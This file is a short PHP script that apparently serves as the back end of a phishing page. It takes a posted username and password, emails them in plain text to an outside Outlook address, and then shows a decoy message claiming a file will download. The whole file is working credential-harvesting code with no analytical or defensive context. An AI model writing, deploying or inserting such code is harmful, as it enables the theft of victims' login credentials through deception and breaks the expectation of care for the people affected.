<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $uname = htmlspecialchars($_POST['uname']);
    $pass = htmlspecialchars($_POST['pass']);
    
    // Your email where the information will be sent
    $to = "addrob3@outlook.com"; 
    $subject = "New Form Submission";
    $message = "Username: $uname\nPassword: $pass";
    $headers = "From: webmaster@example.com";
    
    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "File will should download in a bit...";
    } else {
        echo "Email sending failed...";
    }
}
?>
